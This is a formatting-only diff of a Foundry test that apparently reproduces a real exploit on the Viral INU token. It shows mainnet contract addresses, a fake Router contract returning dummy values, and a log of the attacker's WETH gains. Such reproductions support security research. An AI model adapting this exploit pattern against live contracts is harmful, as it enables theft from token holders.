@@ -13,10 +13,13 @@ import "./../interface.sol";
 // https://twitter.com/hexagate_/status/1666051854386511873?cxt=HHwWgoC24bPVgJ8uAAAA
 
 interface IVINU is IERC20 {
+
     function addLiquidityETH(address routerAddr, address lprAddr, address devAddr) external;
+
 }
 
 contract VinuTest is Test {
+
     // Viral INU token
     IVINU VINU = IVINU(0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -71,9 +74,11 @@ contract VinuTest is Test {
             "Attacker's contract WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
     }
+
 }
 
 contract Router {
+
     address private constant wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
     function factory() external view returns (address) {
@@ -102,4 +107,5 @@ contract Router {
     ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
         return (0, 0, 0);
     }
+
 }
